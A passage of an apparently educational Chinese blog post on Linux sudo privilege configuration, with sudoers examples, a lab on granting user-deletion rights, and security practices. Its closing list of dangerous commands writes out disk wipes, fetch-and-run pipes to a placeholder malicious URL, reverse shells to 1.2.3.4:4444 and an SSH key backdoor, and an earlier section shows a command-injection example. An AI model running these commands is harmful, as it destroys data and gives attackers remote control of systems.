<h4 id="4-1配置语法"><a href="#4-1配置语法" class="headerlink" title="4.1配置语法"></a>4.1配置语法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户/组  主机=(可切换身份)  可执行的命令  [参数]</span><br><span class="line"><span class="comment">#用户/组： % 开头表示组（如 %admin ）。</span></span><br><span class="line"><span class="comment">#主机：ALL 表示所有主机。</span></span><br><span class="line"><span class="comment">#可切换身份：ALL 表示任意用户，可指定为 (root) 。</span></span><br><span class="line"><span class="comment">#命令：需使用绝对路径（如 /usr/bin/apt ）。</span></span><br></pre></td></tr></table></figure>

<h4 id="4-2示例"><a href="#4-2示例" class="headerlink" title="4.2示例"></a>4.2示例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许 wheel 组成员以 root 身份执行所有命令</span></span><br><span class="line">%wheel ALL=(ALL) ALL </span><br><span class="line"><span class="comment"># 允许用户 alice 无需密码重启 Apache </span></span><br><span class="line">alice ALL=(root) NOPASSWD: /usr/bin/systemctl restart httpd </span><br><span class="line"><span class="comment"># 允许用户 bob 在特定主机上管理用户</span></span><br><span class="line">bob host01=(root) /usr/sbin/useradd, /usr/sbin/userdel</span><br></pre></td></tr></table></figure>

<h4 id="4-3实验示例"><a href="#4-3实验示例" class="headerlink" title="4.3实验示例"></a>4.3实验示例</h4><h5 id="使一个新用户user777具有删除test用户的权限"><a href="#使一个新用户user777具有删除test用户的权限" class="headerlink" title="使一个新用户user777具有删除test用户的权限"></a>使一个新用户user777具有删除test用户的权限</h5><h6 id="方法一：将新用户加入wheel组"><a href="#方法一：将新用户加入wheel组" class="headerlink" title="方法一：将新用户加入wheel组"></a>方法一：将新用户加入wheel组</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加新用户user777,尝试使用sudo提权</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250801124849608.png" alt="image-20250801124849608"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切换用户user777,使用userdel命令删除test用户</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250801124941877.png" alt="image-20250801124941877"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用sudo 提权尝试删除test用户</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250808121149858.png" alt="image-20250808121149858"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#没有权限使用sudo,只有 在/etc/soduers中的用户才可以</span></span><br><span class="line">[root@<span class="built_in">test</span> ~]# usermod user777 -aG wheel</span><br><span class="line">[root@<span class="built_in">test</span> ~]# <span class="built_in">id</span> user777</span><br><span class="line">uid=1512(user777) gid=1513(user777) 组=1513(user777),10(wheel)</span><br><span class="line">[root@<span class="built_in">test</span> ~]# su - user777</span><br><span class="line">[user777@<span class="built_in">test</span> ~]$ <span class="built_in">sudo</span> userdel -r user01</span><br><span class="line"><span class="comment">#未找到user01用户，已被删除</span></span><br><span class="line">[user777@<span class="built_in">test</span> ~]$ grep user01 /etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250802194441471.png" alt="image-20250802194441471"></p>
<h6 id="方法二：编辑-etc-sudoers-添加特权"><a href="#方法二：编辑-etc-sudoers-添加特权" class="headerlink" title="方法二：编辑&#x2F;etc&#x2F;sudoers 添加特权"></a>方法二：编辑&#x2F;etc&#x2F;sudoers 添加特权</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#新建用户user999,重复方法一中user777的操作，发现无法删除user01</span></span><br><span class="line"><span class="comment">#编辑 /etc/sudoers 文件，将用户user777添加 userdel特权 （编辑前，先将文件进行备 份！！！）</span></span><br><span class="line">[root@<span class="built_in">test</span> ~]#  <span class="built_in">cp</span> /etc/sudoers /tmp/sudoers</span><br><span class="line">[root@<span class="built_in">test</span> ~]# visudo</span><br><span class="line">user777 ALL=(root) /usr/sbin/userdel,/usr/sbin/useradd</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[user777@<span class="built_in">test</span> ~]$ <span class="built_in">sudo</span> userdel -r user01</span><br><span class="line">[<span class="built_in">sudo</span>] user777 的密码：</span><br><span class="line">userdel：/var/spool/mail/user01 并不属于 user01，所以不会删除</span><br><span class="line"><span class="comment">#原因：可能是该文件被其他用户或进程占用，或权限被手动修改过。</span></span><br><span class="line">userdel：/home/user01 并不属于 user01，所以不会删除</span><br><span class="line"><span class="comment">#原因：可能是目录所有权被更改，或残留数据未清理。</span></span><br><span class="line"><span class="comment">#说明并未完全删除彻底</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250802195035344.png" alt="image-20250802195035344"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#解决方法：</span></span><br><span class="line"><span class="comment">#检查并删除邮件目录：</span></span><br><span class="line"><span class="built_in">ls</span> -l /var/spool/mail/test  <span class="comment"># 确认所有权后手动删除</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /var/spool/mail/test</span><br><span class="line"><span class="comment">#检查并删除家目录：</span></span><br><span class="line"><span class="built_in">ls</span> -ld /home/test          <span class="comment"># 确认无重要数据后删除</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -rf /home/test</span><br><span class="line"><span class="comment">#重新执行删除：</span></span><br><span class="line"><span class="built_in">sudo</span> userdel <span class="built_in">test</span></span><br><span class="line"><span class="comment">#成功删除！</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250802191205755.png" alt="image-20250802191205755"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250802191215808.png" alt="image-20250802191215808"></p>
<h3 id="5-实际应用场景："><a href="#5-实际应用场景：" class="headerlink" title="5. 实际应用场景："></a>5. 实际应用场景：</h3><h4 id="5-1-普通用户执行特权命令"><a href="#5-1-普通用户执行特权命令" class="headerlink" title="5.1 普通用户执行特权命令"></a>5.1 普通用户执行特权命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新软件包列表 </span></span><br><span class="line"><span class="built_in">sudo</span> apt update </span><br><span class="line"><span class="comment"># 查看系统日志（需 root 权限） </span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">tail</span> -f /var/log/syslog</span><br></pre></td></tr></table></figure>

<h4 id="5-2-以其他用户身份执行命令"><a href="#5-2-以其他用户身份执行命令" class="headerlink" title="5.2 以其他用户身份执行命令"></a>5.2 以其他用户身份执行命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以用户 mysql 身份启动进程 </span></span><br><span class="line"><span class="built_in">sudo</span> -u mysql /usr/bin/mysqld_safe</span><br></pre></td></tr></table></figure>

<h4 id="5-3-进入特权Shell环境"><a href="#5-3-进入特权Shell环境" class="headerlink" title="5.3 进入特权Shell环境"></a>5.3 进入特权Shell环境</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -i</span><br><span class="line"><span class="comment"># 切换到 root 的完整环境（加载变量） </span></span><br><span class="line"><span class="built_in">sudo</span> -s </span><br><span class="line"><span class="comment"># 启动 root 的 Shell（保持当前目录）</span></span><br></pre></td></tr></table></figure>

<h4 id="5-4-查看用户权限"><a href="#5-4-查看用户权限" class="headerlink" title="5.4 查看用户权限"></a>5.4 查看用户权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l </span><br><span class="line"><span class="comment"># 列出当前用户可执行的命令</span></span><br></pre></td></tr></table></figure>

<h3 id="6-安全最佳实践"><a href="#6-安全最佳实践" class="headerlink" title="6.安全最佳实践"></a>6.安全最佳实践</h3><h4 id="（1）最小权限原则："><a href="#（1）最小权限原则：" class="headerlink" title="（1）最小权限原则："></a>（1）最小权限原则：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#避免赋予 ALL 权限，按需授权特定命令。</span></span><br><span class="line"><span class="comment">#例如：在sudoers配置中允许user1以root权限执行systemctl restart nginx 和systemctl status nginx，而无需输入密码。</span></span><br><span class="line">user1 ALL=(root) /usr/bin/systemctl restart nginx, /usr/bin/systemctl status nginx</span><br></pre></td></tr></table></figure>

<h4 id="（2）禁用密码（谨慎使用）："><a href="#（2）禁用密码（谨慎使用）：" class="headerlink" title="（2）禁用密码（谨慎使用）："></a>（2）禁用密码（谨慎使用）：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许用户无需密码执行命令 </span></span><br><span class="line">user2 ALL=(root) NOPASSWD: /usr/bin/apt update</span><br></pre></td></tr></table></figure>

<h4 id="（3）日志监控："><a href="#（3）日志监控：" class="headerlink" title="（3）日志监控："></a>（3）日志监控：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">检查 /var/log/auth.log 或 /var/log/secure ，追踪可疑操作。</span><br></pre></td></tr></table></figure>

<h4 id="（4）-超时配置："><a href="#（4）-超时配置：" class="headerlink" title="（4） 超时配置："></a>（4） 超时配置：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改默认超时时间（单位：分钟）：修改/etc/sudoers</span></span><br><span class="line">visudo</span><br><span class="line">Defaults timestamp_timeout=5 <span class="comment"># 5 分钟后需重新输入密码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> -v</span><br><span class="line"><span class="comment">#验证显示会话剩余时间</span></span><br><span class="line"><span class="comment">#如果返回 sudo: 需要密码，说明超时已生效。</span></span><br></pre></td></tr></table></figure>

<h4 id="（5）禁用-root-登录："><a href="#（5）禁用-root-登录：" class="headerlink" title="（5）禁用 root 登录："></a>（5）禁用 root 登录：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#结合 sudo 使用，增强安全性：</span></span><br><span class="line"><span class="comment"># 禁用 root SSH 登录（/etc/ssh/sshd_config） </span></span><br><span class="line">PermitRootLogin no </span><br></pre></td></tr></table></figure>

<h3 id="7-常见问题解决"><a href="#7-常见问题解决" class="headerlink" title="7.常见问题解决"></a>7.常见问题解决</h3><h4 id="7-1-用户无法使用-sudo"><a href="#7-1-用户无法使用-sudo" class="headerlink" title="7.1 用户无法使用 sudo"></a><strong>7.1</strong> <strong>用户无法使用</strong> <strong>sudo</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原因：用户未在 /etc/sudoers 中配置。</span></span><br><span class="line"><span class="comment">#解决：</span></span><br><span class="line"><span class="comment">#1. 使用 root 用户添加规则：</span></span><br><span class="line">usermod -aG wheel user777 <span class="comment"># 将用户加入 wheel 组（需组已授权）</span></span><br><span class="line"><span class="comment">#2. 或直接编辑 /etc/sudoers ：</span></span><br><span class="line">visudo</span><br><span class="line">user777 ALL=(ALL) ALL</span><br></pre></td></tr></table></figure>

<h4 id="7-2-命令路径不匹配"><a href="#7-2-命令路径不匹配" class="headerlink" title="7.2 命令路径不匹配"></a><strong>7.2</strong> <strong>命令路径不匹配</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#错误：Sorry,user user4 is not allowed to execute &#x27;/bin/systemctl restart </span></span><br><span class="line">httpd<span class="string">&#x27; as root on host01.</span></span><br><span class="line"><span class="string">#解决：在规则中指定命令的绝对路径：</span></span><br><span class="line"><span class="string">user01 host01=(root) /usr/bin/systemctl restart httpd</span></span><br></pre></td></tr></table></figure>

<h4 id="7-3-避免语法错误"><a href="#7-3-避免语法错误" class="headerlink" title="7.3 避免语法错误"></a><strong>7.3</strong> <strong>避免语法错误</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#风险：直接编辑 /etc/sudoers 可能导致配置失效。</span></span><br><span class="line"><span class="comment">#解决：始终使用 visudo 命令：</span></span><br><span class="line"><span class="built_in">sudo</span> visudo <span class="comment"># 自动检查语法</span></span><br></pre></td></tr></table></figure>

<h3 id="8-高级用法"><a href="#8-高级用法" class="headerlink" title="8. 高级用法"></a><strong>8.</strong> <strong>高级用法</strong></h3><h4 id="8-1-限制命令参数"><a href="#8-1-限制命令参数" class="headerlink" title="8.1 限制命令参数"></a><strong>8.1</strong> <strong>限制命令参数</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 允许 user01 仅能添加用户(禁止删除)。限制用户命名规则，防止恶意破坏</span></span><br><span class="line">user01 ALL=(root) /usr/sbin/useradd [A-Za-z]*</span><br><span class="line"><span class="comment">#可能存在的恶意破坏，例如：命令注入攻击</span></span><br><span class="line"><span class="built_in">sudo</span> useradd  | <span class="built_in">rm</span> -rf</span><br></pre></td></tr></table></figure>

<h3 id="9-总结"><a href="#9-总结" class="headerlink" title="9. 总结"></a><strong>9.</strong> <strong>总结</strong></h3><h4 id="（1）对比：-sudo-vs-su"><a href="#（1）对比：-sudo-vs-su" class="headerlink" title="（1）对比： sudo vs su"></a>（1）对比： sudo <strong>vs</strong> su</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/seventeen526/picgo/main/img/image-20250802203504831.png" alt="image-20250802203504831"></p>
<p>通过合理配置 sudo ，可以在保障系统安全的前提下，高效完成日常管理任务。始终遵循最小权限原则，并定期审计权限分配。</p>
<h4 id="（2）危害比较大的命令"><a href="#（2）危害比较大的命令" class="headerlink" title="（2）危害比较大的命令:"></a>（2）危害比较大的命令:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除跑路(文件系统删除)</span></span><br><span class="line"><span class="built_in">rm</span> -rf /*</span><br><span class="line">find / -delete</span><br><span class="line"><span class="comment">#远程代码执行，下载并执行恶意脚本</span></span><br><span class="line">wget http://恶意网址/backdoor.sh -O- | sh</span><br><span class="line">curl -sSL 恶意网址/script.sh | bash</span><br><span class="line"><span class="comment">#反弹shell</span></span><br><span class="line"><span class="comment"># 常见变种</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/1.2.3.4/4444 0&gt;&amp;1</span><br><span class="line">nc -e /bin/sh 1.2.3.4 4444</span><br><span class="line">socat TCP:1.2.3.4:4444 EXEC:/bin/sh</span><br><span class="line"><span class="comment">#SSH后门</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa 恶意公钥&quot;</span> &gt;&gt; ~/.ssh/authorized_keys</span><br><span class="line"><span class="built_in">chmod</span> 600 ~/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#应立即隔离，断开网络。</span></span><br><span class="line"><span class="comment">#取证分析，从干净介质重装系统</span></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">John Doe</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/')">提权</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=提权&amp;url=http://example.com/2025/07/29/%E6%8F%90%E6%9D%83/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/linux/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>linux<span class="tagsPageCount">9</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/29/%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">用户权限</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/29/%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">压缩和解压缩</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2025/07/29/Centos8%20Apache%E7%9A%84%E6%90%AD%E5%BB%BA/" title="Centos8 Apache的搭建"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-29</div><div class="title">Centos8 Apache的搭建</div></div></a></div><div><a href="/2025/07/29/linux/" title="linux文件管理与查询"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-29</div><div class="title">linux文件管理与查询</div></div></a></div><div><a href="/2025/07/29/VIM%E7%BC%96%E8%BE%91%E5%99%A8%E5%92%8C%E7%94%A8%E6%88%B7%E7%BB%84%E7%AE%A1%E7%90%86/" title="VIM编辑器和用户组管理"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-29</div><div class="title">VIM编辑器和用户组管理</div></div></a></div><div><a href="/2025/07/29/linux%E5%9F%BA%E7%A1%80%E5%A4%A7%E4%BD%9C%E4%B8%9Aw1/" title="linux基础作业w1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-29</div><div class="title">linux基础作业w1</div></div></a></div><div><a href="/2025/07/29/%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9/" title="压缩和解压缩"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-29</div><div class="title">压缩和解压缩</div></div></a></div><div><a href="/2025/07/29/%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/" title="用户权限"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-07-29</div><div class="title">用户权限</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% 